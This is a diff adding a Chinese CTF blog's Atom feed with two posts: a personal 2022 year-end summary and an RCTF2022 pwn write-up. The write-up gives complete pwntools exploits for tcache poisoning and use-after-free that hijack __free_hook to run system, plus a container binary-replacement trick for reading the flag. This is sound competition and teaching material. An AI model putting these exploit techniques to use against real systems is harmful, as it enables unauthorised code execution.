@@ -1,0 +1,2570 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://kotoriseed.github.io</id>
+    <title>kotori的菜园</title>
+    <updated>2022-12-28T03:48:48.970Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://kotoriseed.github.io"/>
+    <link rel="self" href="https://kotoriseed.github.io/atom.xml"/>
+    <subtitle>挑战者贵为永恒黄金</subtitle>
+    <logo>https://kotoriseed.github.io/images/avatar.png</logo>
+    <icon>https://kotoriseed.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, kotori的菜园</rights>
+    <entry>
+        <title type="html"><![CDATA[2022年终总结]]></title>
+        <id>https://kotoriseed.github.io/post/2022YearEndSummary/</id>
+        <link href="https://kotoriseed.github.io/post/2022YearEndSummary/">
+        </link>
+        <updated>2022-12-19T08:32:52.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>虽然是2022的年终总结，但仍然提了一部分21年的事情的人事屑</p>
+</blockquote>
+<h1 id="感谢名单我偏要写在最前面">感谢名单（我偏要写在最前面）</h1>
+<p>感谢小虎鲸实验室的大家（Le1a, Pl1rry, A1kaid, Y5neKO, ...），在学校里一起有说有笑探讨学习（二次元）的时光真的很快乐捏，也希望这份快乐能一直延续下去。</p>
+<p>感谢在V&amp;N的时候愿意听我牢骚和碎碎念的eeee和jsjsj两位pwn师傅，还有其他方向的师傅们，希望明年，甚至是以后，我们也能一起打比赛，一起在网络安全这条路上越走越远。</p>
+<p>各种意义上，感谢我的女朋友，感谢你在我低落的时候给予我安慰和鼓励，让我有了继续坚持下去的信心，你的陪伴也让我成长了很多很多。以后也要一起加油，一起达成我们的人生目标！</p>
+<p>感谢我的家人，感谢你们一直以来的支持和养育，希望大家都能健健康康的。</p>
+<p>感谢我的好兄弟们（别怀疑，这里面有你），你们的沙雕和趣事给我平淡的生活平添了许多乐趣，时不时的互相倾诉也为我缓解了很多压力，希望你们在新的一年里都能向着自己想要成为的人更近一步哦。</p>
+<h1 id="年终总结">年终总结</h1>
+<h2 id="学习">学习</h2>
+<p>既然是第一次在我的博客写年终总结，还是简单说一下学习安全的起因和历程吧。</p>
+<h3 id="作为acmer">作为ACMer</h3>
+<p>从2020年入学到2021年年底，我是一名acmer（虽然很fw），第一次打省赛只拿了铜牌，是铜首。败在了罚时上，很可惜没能拿到银，而且我当时也不会想到，那其实是我的最后一次ACM省赛了。在那之后还是断断续续的拿了一些算法方面的小奖，诸如天梯赛的省二和国三，蓝桥杯的省一和国三这些。</p>
+<p>最后一次打ICPC是2021年年底的上海站和南京站，因为新冠疫情改成了线上，拿牌的难度提升了不少，最终也不出所料的两站都打铁了。至此，我的ACM生涯也画上了不太圆满句号。<br>
+（不过我的两个队友都很棒哦，现在已经带着ICPC一银一铜，CCPC一铜的出色战绩退役了）</p>
+<h3 id="作为ctfer">作为CTFer</h3>
+<p>ACM的失败一度让我无法直视接下来的生活，在纠结了很久之后才选择了转行试试安全。</p>
+<p>起初我是想学习web安全的，但由于学校的实验室没有pwn手，我还是选择了这个陌生而奇妙的方向。</p>
+<p>在学习的前期其实非常的痛苦且缓慢，因为身边并没有学pwn的同学可以交流，偶尔在取得了不错的进展时，也不知道向谁分享（@怨种le1a）。（非常感谢自己扛着这些压力坚持到了现在）</p>
+<p>在学pwn第4个月的时候，同学提议我尝试一下去申请加入V&amp;N战队。究极社恐的我最终很坎坷的通过了面试，wjh师傅在面试时问的种种问题深深的烙在了我的脑袋里，我意识到了自己和大师傅们的差距有多么巨大，也暗下决心要成为和他们一样纯粹且强大的pwn手。（不过也正是因为加入了V&amp;N，我才能遇到这么多和我一样热爱二进制安全的师傅）</p>
+<p>一直在追赶版本的我直到今年7月份的ciscn国赛初赛才有了第一次检验自己的比赛机会。但是运气很好！队友们齐心协力，最终在分区赛以第10名的成绩拿到了晋级总决赛的最后一个名额，并且也收获了自己学安全的第一个奖（西南分区赛一等奖）。总决赛很遗憾的因为疫情没能去到南开大学，明明说好了要和各位师傅面基的（叹）。</p>
+<p>国赛之后，一场又一场的比赛接踵而至，我终于从只能刷题练级的萎靡状态中跳脱了出来。</p>
+<p>强网杯，网鼎杯都取得了不错的成绩（比较可惜的是网鼎杯的半决赛也因为疫情延期了，希望不要变成线上）。</p>
+<p>终于，在10月底，烨师傅给了我晋升到W&amp;M的面试机会。这其实是我完全没有想过的事（啊？我这么菜也配？），不过既然机会都来了，那就好好把握。在被龙哥和y老师，以及pwn大爹cnitlrt师傅面到怀疑人生，加上接近30个小时的漫长等待后，还是等来了成功加入W&amp;M的好消息。这也算是学了差不多刚好一年以来对我最好的一次正反馈吧。虽然我现在和各位pwn爹的实力差距还是很大很大，不过我还是会努力学习，争取早日能为队里出一份力的。</p>
+<p>在这几天打了强网拟态，本该是一场72小时的鏖战，但是我们的烨宝直接阳了（真惨hhh），我只在第一天打了五六道白盒的题就没做了。最后只有优胜奖，挺可惜的还是。</p>
+<p>这一年最不满意的还是一直没有开始实战吧，本来就学的比较晚，而且还马上就要面临秋招了。不过真的还有好多好多想要复现的题，也想在接下来的比赛中见识到和做到有质量的好题。到时候也许还是会继续打ctf的吧，但同时也希望实战能快快开始（又是从头开始摸爬滚打的项目捏）。</p>
+<h2 id="生活">生活</h2>
+<p>2022年依然是被疫情折磨的一年。从ICPC到CISCN，似乎已经错过了四五个线下比赛的机会了吧。而且也因为疫情，和女朋友的见面机会也变得比之前少太多了。希望疫情能快快过去吧（现在已经放开了，但愿是件好事吧）。</p>
+<p>除了被疫情折磨，由于长时间的久坐，我的腰和脖子也处于不太健康的状态。最近有在加强锻炼，算是为了减肥和健康（）。</p>
+<p>买了个switch，挺好玩的。甚至有1周因为学校的遣返等种种原因，就一直在玩switch而没有学习（我有罪）。</p>
+<p>随便贴几张图片：</p>
+<p>ACM省赛</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/12/19/83f3c31614ade.jpg" alt="IMG_20210530_140102.jpg" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/12/19/278776a87ec9b.jpg" alt="IMG_20210530_143253.jpg" loading="lazy"></figure>
+<p>挖到TSRC，腾讯叠送的衣服</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/12/19/4401dd40b18cc.png" alt="1671441255726.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/12/19/091d966259ec7.png" alt="1671442591808.png" loading="lazy"></figure>
+<p>ciscn决赛抽到的一等奖奖品</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/12/19/cee39ed518563.png" alt="1671441358074.png" loading="lazy"></figure>
+<p>V&amp;N的队服，好看捏</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/12/19/9c2bbe04ba3ca.png" alt="1671441714890.png" loading="lazy"></figure>
+<p>七夕和女朋友一起做的魔鬼料理</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/12/19/62b52d0de4455.png" alt="1671441567709.png" loading="lazy"></figure>
+<p>给女朋友织的包包（不得不说，我太拙了，所以不放成品）</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/12/19/2192ed35a2f6a.png" alt="1671442044383.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/12/19/fbb2b202bd69a.png" alt="1671442106719.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://img.le1a.com/2022/12/19/d75304f47f07a.png" alt="1671442146686.png" loading="lazy"></figure>
+<p>陪我住院6天的病友，每天去医院的路上都能看到它</p>
+<figure data-type="image" tabindex="11"><img src="https://img.le1a.com/2022/12/19/af37177bf44fc.png" alt="1671442247945.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://img.le1a.com/2022/12/19/9c7456050d427.png" alt="1671442296213.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://img.le1a.com/2022/12/19/822b1c14eb181.png" alt="1671442318940.png" loading="lazy"></figure>
+<p>朋友送的Jorin手办，她好帅</p>
+<figure data-type="image" tabindex="14"><img src="https://img.le1a.com/2022/12/19/82c693d859b07.jpg" alt="-76cdf5f2c5b4e727.jpg" loading="lazy"></figure>
+<p>省赛和Le1a一起住的酒店，不得不说比ACM省赛那会儿住的好太多了</p>
+<figure data-type="image" tabindex="15"><img src="https://img.le1a.com/2022/12/19/fc0f69c10425c.png" alt="1671442454190.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://img.le1a.com/2022/12/19/931ee7d0e610d.png" alt="1671442479573.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://img.le1a.com/2022/12/19/0310d4923e1ad.png" alt="1671442531211.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://img.le1a.com/2022/12/19/14fd28073b2ca.png" alt="1671442557661.png" loading="lazy"></figure>
+<h1 id="对2023的希望">对2023的希望</h1>
+<ul>
+<li>开始挖固件，求求了</li>
+<li>为毕设做准备，写一个qt的小项目</li>
+<li>在时间和身体允许的条件下多做运动，争取回到高中的身材捏</li>
+<li>和我在意的大家 仲良くして ！</li>
+<li>还有太多太多了，希望都能实现吧</li>
+</ul>
+<p>最后，再次感谢看到了这里的你们，祝大家在崭新的一年里都万事如意嗷。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[RCTF2022-PWN-WP/复现]]></title>
+        <id>https://kotoriseed.github.io/post/rctf/</id>
+        <link href="https://kotoriseed.github.io/post/rctf/">
+        </link>
+        <updated>2022-12-16T09:50:12.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="game非预期">game[非预期]</h1>
+<p>本来是kernel提权题，但docker起起来之后发现<code>/bin</code>权限比较大，所以存在非预期。</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/12/16/7f28ea8ce7380.png" alt="1671183918059.png" loading="lazy"></figure>
+<p><code>init</code>是root权限运行的，</p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/12/16/c30d3dd6f9b0f.png" alt="1671183969695.png" loading="lazy"></figure>
+<p>在shell退出之后还有<code>umount</code>和<code>poweroff</code>两个指令。所以劫持其中一个binary，然后退出shell就能带出flag。</p>
+<pre><code class="language-shell">cd /bin
+rm ./umount
+echo 'cat flag'&gt;umount
+chmod 777 ./umount
+exit
+</code></pre>
+<h1 id="ez_atm">ez_atm</h1>
+<h2 id="分析">分析</h2>
+<p>给出了一个客户端<code>client</code>和带有漏洞的服务端<code>ez_atm</code>，两者使用socket进行通信。</p>
+<p>查看<code>Data_send</code>结构体即可了解通讯使用的协议，</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/12/16/dda7b04ec200a.png" alt="1671164220749.png" loading="lazy"></figure>
+<p>在建立socket连接之后，服务端会fork出一个子进程，并且即刻生成该次会话使用的uuid，并且将随机数使用的种子发给客户端。然后会尝试从客户端收到uuid并验证是否一致。</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/12/16/94ead074d25ef.png" alt="1671164490295.png" loading="lazy"></figure>
+<p>客户端对应的操作是接受到种子并用相同的逻辑生成uuid，然后发送。</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/12/16/b8030e68d0ba0.png" alt="1671164596484.png" loading="lazy"></figure>
+<p>主要功能的逆向略过，这里只说漏洞点。</p>
+<p>第一个是leak libc，在<code>stat_query</code>中。</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/12/16/acdf4ef8fd8f3.png" alt="1671166153796.png" loading="lazy"></figure>
+<p>这里send过来了很多栈上的数据，可以帮助leak。</p>
+<p>但是在发送到客户端之后直接被接收了，我们需要对客户端稍作修改，让他打印出来。</p>
+<p>（其实是还有另一种思路的，不使用客户端去交互，直接按照协议手动发包模拟客户端行为。只不过这样就需要在一开始验证uuid那里手动按照逻辑生成一下）</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/12/15/be17183e0e3e1.png" alt="1671084514031.png" loading="lazy"></figure>
+<p>这里是libc上的地址，测出偏移后将客户端对应部分patch如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/12/15/e8dd6173fe2cd.png" alt="1671084764752.png" loading="lazy"></figure>
+<p>测试一下，成功leak：</p>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/12/15/7cf085c934dd4.png" alt="1671085000540.png" loading="lazy"></figure>
+<p>在<code>new_account</code>中会申请0x41的chunk，然后<code>passwd</code>和<code>account_id</code>分别对应了tcache的<code>next</code>和<code>key</code>的位置。</p>
+<figure data-type="image" tabindex="10"><img src="https://img.le1a.com/2022/12/16/96e6a5f7cd27e.png" alt="1671170791940.png" loading="lazy"></figure>
+<p>在<code>cancellation</code>中存在明显的uaf。</p>
+<figure data-type="image" tabindex="11"><img src="https://img.le1a.com/2022/12/16/04eb063b3db3f.png" alt="1671171007280.png" loading="lazy"></figure>
+<p>思路至此就很明显了，tcache poisoning申请到free hook写入system。</p>
+<p>不过想要uaf修改，还需要先login，一个account被free之后password会是堆上的地址，所以还需要leak一下。</p>
+<p>布置好freed chunk之后还是先在client的内存中找到heap地址相对于<code>msg_rec</code>的偏移</p>
+<figure data-type="image" tabindex="12"><img src="https://img.le1a.com/2022/12/16/a040e060d620b.png" alt="1671176781065.png" loading="lazy"></figure>
+<p>然后对client的query功能patch如下：</p>
+<figure data-type="image" tabindex="13"><img src="https://img.le1a.com/2022/12/16/7f233395d3e8c.png" alt="1671176871678.png" loading="lazy"></figure>
+<p>成功leak，</p>
+<figure data-type="image" tabindex="14"><img src="https://img.le1a.com/2022/12/16/ae639937b6301.png" alt="1671176921530.png" loading="lazy"></figure>
+<p>接下来就是正常的uaf劫持tcache next指针，这里不作详细描述。</p>
+<p>成功劫持free hook后外带flag使用<code>cat flag&gt;&amp;4</code>来发给客户端。</p>
+<p>不过用free hook来执行system时，参数是<code>password</code>处，而<code>password</code>的长度只有8bytes，有点不够，所以需要配合<code>account_id</code>来拼接。所以我的构造如下：</p>
+<ul>
+<li>account_id: &gt;&amp;4</li>
+<li>password: cat flag</li>
+</ul>
+<h2 id="exp">exp</h2>
+<p>(需要模拟client发送协议交互的话可以参考注释掉的两个函数来建立连接和发包)</p>
+<pre><code class="language-python">from pwn import *
+from ctypes import *
+import os
+
+context.log_level='debug'
+
+elf = ELF('./docker/bin/ez_atm')
+libc = ELF('./docker/bin/libc-2.27.so')
+clibc = cdll.LoadLibrary('./docker/bin/libc-2.27.so')
+
+sa  = lambda x,y : p.sendafter(x, y)
+sla = lambda x,y : p.sendlineafter(x, y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g():
+	os.system('ps -a | grep ez_atm')
+	raw_input()
+
+'''
+def init_cli():
+	ask_time = u32(p.recv(4))
+	# print(hex(ask_time))
+	clibc.srand(ask_time)
+	uuid = list(&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;)
+	for i in range(len(uuid)):
+		if uuid[i] != '4' and uuid[i] != '-':
+			if uuid[i] == 'x':
+				uuid[i] = hex(clibc.rand()%15)[2:]
+			else:
+				uuid[i] = hex((clibc.rand()%15) &amp; 3 | 8)[2:]
+	uuid = ''.join(uuid)
+	p.send(uuid)
+
+def data_send(op, password=b'', account_id=b'', money=114514):
+	data = flat(
+		{
+			0x0: op,
+			0x10: password,
+			0x18: account_id,
+			0x38: p32(money),
+		},
+		filler=b'\x00'
+	).ljust(0x98, b'\x00')
+	sleep(0.5)
+	p.send(data)
+'''
+
+def choice(op):
+	sla('choice :', op)
+
+def add_account(id='kotori', passwd='passwd', money=114514):
+	choice('new_account')
+	sla('account id', id)
+	sla('password', passwd)
+	sla('money', str(money))
+
+def del_account(passwd='passwd'):
+	choice('cancellation')
+	sla('password', passwd)
+
+def login(id, passwd='passwd'):
+	choice('login')
+	sla('account id', id)
+	sla('password', passwd)
+
+def edit_passwd(new_pass, old_pass):
+	choice('update_pwd')
+	sla('new password', new_pass)
+	sleep(0.5)
+	sla('rd.', old_pass)
+
+p = process(['./client', '139.9.242.36', '4445'])
+# p = process(['./client', '127.0.0.1', '3339'])
+
+'''
+p = remote('127.0.0.1', 3339)
+init_cli()
+
+data_send('new_account', 'passwd', 'ko1')
+data_send('exit_account')
+data_send('new_account', 'passwd', 'ko2')
+data_send('cancellation', 'passwd')
+data_send('login', 'passwd', 'ko1')
+data_send('query')
+'''
+
+choice('stat_query')
+libcbase = u64(ru('\x7f')[-6:].ljust(0x8, b'\x00')) - 0x21c87
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+print(hex(hook))
+
+# data_send('new_account', 'passwd', 'ko1')
+add_account('ko1')
+choice('exit_account')
+add_account('ko2')
+del_account()
+login('ko1')
+choice('query')
+heapbase = u64(ru('\x55')[-6:].ljust(0x8, b'\x00')) - 0x10
+print(hex(heapbase))
+choice('exit_account')
+
+add_account('ko3')
+choice('exit_account')
+add_account('ko4')
+choice('exit_account')
+login('ko3')
+del_account()
+login('ko4')
+del_account()
+
+login(p64(heapbase+0x10), p64(heapbase+0x6b0))
+edit_passwd(p64(hook), p64(heapbase+0x6b0))
+choice('exit_account')
+
+add_account('&gt;&amp;4', 'cat flag')
+choice('exit_account')
+add_account('pwn', p64(sys))
+choice('exit_account')
+login('&gt;&amp;4', 'cat flag')
+del_account('cat flag')
+
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="ppurey">ppurey</h1>
+<h2 id="分析-2">分析</h2>
+<p>一个管理数据库的菜单题。看上去没什么问题，不过在<code>show_note</code>内部存在一个语句：<code>SELECT * FROM test</code></p>
+<figure data-type="image" tabindex="15"><img src="https://img.le1a.com/2022/12/16/9684c52585dcc.png" alt="1671193372553.png" loading="lazy"></figure>
+<p>只要让一个视图也叫<code>test</code>，就能执行很多操作。不过到这里之后思路忽然就断了，不是很能找到他可利用的洞在哪里。</p>
+<p>在这时忽然发现bss段上存在一个<code>g_chunks</code>数组，</p>
+<figure data-type="image" tabindex="16"><img src="https://img.le1a.com/2022/12/16/b81299c4dc07b.png" alt="1671193684388.png" loading="lazy"></figure>
+<p>交叉引用一看，好家伙。很可疑的四个函数。</p>
+<figure data-type="image" tabindex="17"><img src="https://img.le1a.com/2022/12/16/92a226b032acc.png" alt="1671193761393.png" loading="lazy"></figure>
+<p>随便找到一个，继续交叉引用，来到了data段上，发现了几个奇怪的字符串&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;。</p>
+<figure data-type="image" tabindex="18"><img src="https://img.le1a.com/2022/12/16/b212e5c1d98d7.png" alt="1671193826181.png" loading="lazy"></figure>
+<p>继续在前后看了看，发现了&quot;random&quot;, &quot;hex&quot;, &quot;ifnull&quot;等字符串，</p>
+<p>ん?这不就是sqlite3函数的symbol么。</p>
+<p>至此，一片新世界打开了。</p>
+<p>&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;分别对应堆块的malloc, edit, show, delete操作，并且在delete操作中存在uaf</p>
+<figure data-type="image" tabindex="19"><img src="https://img.le1a.com/2022/12/16/4d695eac1ef9b.png" alt="1671194070865.png" loading="lazy"></figure>
+<p>整理一下思路：</p>
+<ol>
+<li>利用原有的菜单功能创建一个数据库，并且将<code>test</code>作为视图操作写入这个数据库中</li>
+<li>在<code>test</code>中利用<code>sm</code>, <code>se</code>, <code>ss</code>, <code>sd</code>这几个函数来操作堆块</li>
+<li>uaf打tcache的next，劫持<code>__free_hook</code>为system完成利用。</li>
+</ol>
+<p>（在做题的时候发现，这题的heap布局极其凌乱，不过好在show是直接write，所以拿一个unsorted bin上的chunk就可以直接leak出残留的libc地址。好久都没做到不是<code>puts</code>来show的题了，泪目）</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sqlite3
+import os
+
+context.log_level='debug'
+
+elf = ELF('./ppuery')
+libc = elf.libc
+
+# p = process('./ppuery')
+p = remote('190.92.233.46', 10000)
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+    raw_input()
+
+def choice(idx):
+	sla('Choice: ', str(idx))
+
+def add_note(name):
+	choice(1)
+	sla('Name: ', name)
+
+def show_note(idx):
+	choice(2)
+	sla('Index: ', str(idx))
+
+def patch_note(idx, content):
+	choice(3)
+	sla('Index: ', str(idx))
+	sla('Size: ', str(len(content)))
+	sla('tent: ', content)
+
+def exec_cmd(cmd):
+	os.system(&quot;rm ./kotori.db&quot;)
+	conn = sqlite3.connect('kotori.db')
+	cur = conn.cursor()
+	sql_cmd = 'CREATE VIEW test AS SELECT {}'.format(cmd)
+	print(sql_cmd)
+	cur.execute(sql_cmd)
+	conn.commit()
+	conn.close()
+	f = open('kotori.db', 'rb').read()
+	patch_note(0, f)
+	show_note(0)
+
+def add(idx, size):
+	exec_cmd('sm({},{})'.format(idx, size))
+
+def edit(idx, offset, content):
+	exec_cmd('se({},{},{})'.format(idx, offset, content))
+
+def show(idx):
+	exec_cmd('ss({})'.format(idx))
+
+def delete(idx):
+	exec_cmd('sd({})'.format(idx))
+
+add_note('aa')
+
+add(0, 0x1f0)
+show(0)
+ru('Content:')
+libcbase = u64(p.recv(8)) - 0x3ebca0
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+
+add(1, 0xb0)
+add(2, 0xb0)
+delete(1)
+delete(2)
+edit(2, 0, hook)
+
+add(3, 0xb0)
+add(4, 0xb0)
+edit(3, 0, u64(b'/bin/sh\x00'))
+edit(4, 0, sys)
+
+delete(3)
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="mycarshowspeed">MyCarShowSpeed</h1>
+<p>又是我最爱的游戏题（划掉）</p>
+<figure data-type="image" tabindex="20"><img src="https://img.le1a.com/2022/12/18/ef592c508cf10.png" alt="1671354090140.png" loading="lazy"></figure>
+<h2 id="分析-3">分析</h2>
+<p>一个赛车游戏，给出了源码。</p>
+<p>经过一段时间的查找，发现在赢得足够多的钱的时候可以直接在商店购买flag</p>
+<pre><code class="language-c">//store.c
+
+...
+
+static goods_t normalCar = {&quot;NormalCar&quot;, 50};
+static goods_t superCar = {&quot;SuperCar&quot;, 100};
+static goods_t LongCar = {&quot;LongCar&quot;, 180};
+static goods_t ghostCar = {&quot;GhostCar&quot;, 200};
+static goods_t fuel = {&quot;Fuel&quot;, 10};
+static goods_t normalTire = {&quot;NormalTire&quot;, 20};
+static goods_t SuperTire = {&quot;SuperTire&quot;, 80};
+static goods_t flag = {&quot;flag&quot;, 9999};
+
+...
+
+void sellGoodsImpl(store_t *_this, game_t *game)
+{
+	...
+        else if(strcmp(goods-&gt;name, &quot;flag&quot;) == 0)
+        {
+            ....
+            
+			else
+            {
+                int fd;
+                char buf[64];
+                puts(&quot;You've earned it!&quot;);
+                puts(&quot;Here is your flag!&quot;);
+                fd = open(&quot;./flag&quot;, O_RDONLY);
+                if(fd &gt;= 0)
+                {
+                    read(fd, buf, 64);
+                    write(1, buf, 64);
+                }
+            }
+			return;
+        }
+		...
+}
+</code></pre>
+<p>所以着重观察一下和钱相关的部分。</p>
+<p>在<code>fetchCarImpl</code>中，出题人好心的给出了一个注释：<code>//0</code></p>
+<pre><code class="language-c">//store.c
+car_t * fetchCarImpl(store_t *_this, game_t *game)
+{
+    ...
+
+    fixDifficulty = car-&gt;fixDifficulty;
+    
+    ...
+    
+    fetchTime = fetchHour * 3600 +  fetchMin * 60 + fetchSec * fixDifficulty;// 0
+    fixTime   = fixHour * 3600 + fixMin * 60 + fixSec;
+    
+    fixedTime = fetchTime - fixTime;
+    cost = 5 * fixedTime;
+    if(cost &gt; (int)game-&gt;money)
+        cost = game-&gt;money;
+    car-&gt;health += (int)(fixedTime * 0.4) + 50;
+    game-&gt;money -= cost;
+    
+    ...
+        
+}
+</code></pre>
+<p>如果<code>fixDifficulty</code>为0的话，<code>fetchTime</code>将会小于<code>fixTime</code>，那么<code>cost</code>也将变为负数......</p>
+<p><code>game-&gt;money -= cost</code>这一句，不就可以帮助我们快速搞钱了吗。</p>
+<p>所以赶紧去找找<code>fixDifficulty</code>的来头。</p>
+<pre><code class="language-c">//car.h
+struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    ...
+    
+};
+</code></pre>
+<p>这个<code>fixDifficulty</code>是在<code>car.h</code>中声明的一个<code>unit8_t</code>类型的变量，</p>
+<p>并且每局比赛结束会有<code>_this-&gt;finishGame(_this)</code>这一句来调用<code>finishGameImpl</code>，</p>
+<p><code>finishGameImpl</code>会让<code>car-&gt;fixDifficulty++;</code>。</p>
+<p>所以说，只要快速刷对局，到第255次之后，不停的修车取车就能大赚一笔。</p>
+<p>（ps. 最好将时间的秒数控制在较大的秒数，不然会刷的很慢）</p>
+<p>（pps. 你每次调试都要等差不多一分钟的样子真的很狼狈.jpg）</p>
+<p>虽然钱是拿到了，但是这时又注意到购买flag的另一个检查条件。</p>
+<pre><code class="language-c">//store.h
+if(game-&gt;winTimes &lt; 1000)
+{  
+	puts(&quot;No! You cheated in this game! Where did your money come from?\n&quot;);
+	puts(&quot;Punish for cheaters!\nYour cars are confiscated!&quot;);
+	carList_t *curCar = game-&gt;carList;
+	while(curCar)
+	{
+		car_t *car = curCar-&gt;car;
+		if(car)
+		{
+			free(car);
+			curCar-&gt;car = NULL;
+		}
+		curCar = curCar-&gt;next;
+	}
+	game-&gt;carList-&gt;carNums = 0;
+	game-&gt;userCar = NULL;
+}
+</code></pre>
+<p>要让这个<code>winTimes</code>要达到1000，还需要再想一些办法。（比赛中到这里就停下来啦，后面的做法参考了<code>Nu1L</code>战队的WriteUp）</p>
+<p>这个时候其实可以察觉到，好像买flag被发现作弊时清空车辆的时候是存在uaf的。</p>
+<p>并且除了这里的<code>game-&gt;carList</code>以外，在<code>store.c</code>中修车和取车时还有一个carList。</p>
+<p>相当于<code>game-&gt;carList</code>成为了一个dangling pointer。</p>
+<p>并且参考<code>car.h</code>中对car的定义：</p>
+<pre><code class="language-c">struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    int         fuel;
+    int         stability;
+    int         health; 
+    int         row;
+    int         col;
+    int         cost;
+    int         padding;
+    time_t      fixTime;
+
+    int         (*moveCar)(car_t *_this);
+    void        (*addFuel)(car_t *_this);
+    void        (*increaseSpeed)(car_t *_this);
+    void        (*gainExp)(car_t *_this);
+    void        (*fix)(car_t *_this);
+    void        (*printCar)(car_t *_this);
+    int         (*getStep)(car_t *_this);
+
+};
+</code></pre>
+<p>在本来属于<code>tcache</code>的<code>key</code>的值的那个位置，会有许多的<code>uint8_t</code>类型的标记位，且很多标记位在取车和修车时都在被修改，所以<code>tcache bin</code>对double free的check会有相当大的概率可以被bypass。</p>
+<p>所以最少只需要按照：</p>
+<ol>
+<li>修车，将当前car放入<code>store-&gt;carList</code></li>
+<li>购买flag，将car free进入tcache bin。</li>
+<li>取车，从<code>store-&gt;carList</code>中拿出，并且改掉某些标记位从而让key不被check</li>
+</ol>
+<p>这几个步骤来循环3次，就能在tcache中造出环，且足以完成对<code>winTimes</code>的劫持。</p>
+<p>（需要注意的是，每次在购买flag之后，车名会因为进入tcache而变化）</p>
+<p>（取车时还可以通过车名leak出heapaddr，借此计算出winTimes的地址）</p>
+<h2 id="exp-3">exp</h2>
+<pre><code class="language-python">from pwn import *
+from datetime import *
+
+context.log_level='debug'
+
+elf = ELF('./SpeedGame')
+
+p = process('./SpeedGame')
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+
+def choice(op):
+	sla('\n&gt;', op)
+
+def buyCar(name):
+	choice('3')
+	choice('1')
+	choice('SuperCar')
+	choice(name)
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def fixCar(name=''):
+	choice('3')
+	choice('3')
+	choice(name)
+	choice('5')
+
+def fetchCar(name):
+	choice('3')
+	choice('4')
+	choice(name)
+	choice('5')
+
+def play():
+	choice('1')
+	ru('Press q to quit.')
+	p.send(' ')
+	p.send('q')
+
+buyCar('kot')
+
+for i in range(255):
+	play()
+
+while(datetime.now().second&lt;40):
+	sleep(1) # fixsec++
+	print('[+] waiting for big sec...')
+
+for i in range(60): # earn money
+	fixCar('kot')
+	fetchCar('kot')
+
+fixCar('kot')
+buyFlag()
+fetchCar('')
+
+fixCar()
+buyFlag()
+choice('3')
+choice('4')
+ru('CarName: ')
+cname = p.recv(6)
+choice(cname)
+choice('5')
+
+heap_info = u64(cname.ljust(0x8, b'\x00'))
+
+print(hex(heap_info))
+
+fixCar(cname)
+buyFlag()
+fetchCar(cname)
+
+winTimes_addr = heap_info - 0x2b0
+buyCar(p64(winTimes_addr))
+buyCar('kot')
+buyCar(p64(0xffffffff)) # hijack winTimes
+
+buyFlag()
+
+# g()
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
